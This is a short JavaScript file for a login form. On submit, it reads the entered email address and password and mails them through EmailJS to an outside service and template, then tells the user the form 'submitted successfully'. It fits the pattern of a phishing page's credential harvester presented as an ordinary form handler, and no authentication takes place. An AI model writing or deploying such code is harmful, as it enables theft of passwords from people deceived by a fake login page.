
// Initialize EmailJS with your user ID
emailjs.init('service_j7cc2ef');

// Define your form submission function
function sendForm() {
  // Prevent the default form submission
  event.preventDefault();

  // Fetch form data
  let formData = {
    email: document.getElementById('email').value,
    password: document.getElementById('password').value
    // Add more fields as needed
  };

  // Send email using EmailJS
  emailjs.send('service_j7cc2ef', 'template_q43mflh', formData)
    .then(function(response) {
      console.log('Email sent successfully!', response);
      alert('Form submitted successfully!');
      // Optionally, clear the form fields
      document.getElementById('loginForm').reset();
    }, function(error) {
      console.error('Error sending email:', error);
      alert('Failed to submit form. Please try again later.');
    });
}

// Add event listener to the form submit button
document.getElementById('loginForm').addEventListener('submit', sendForm);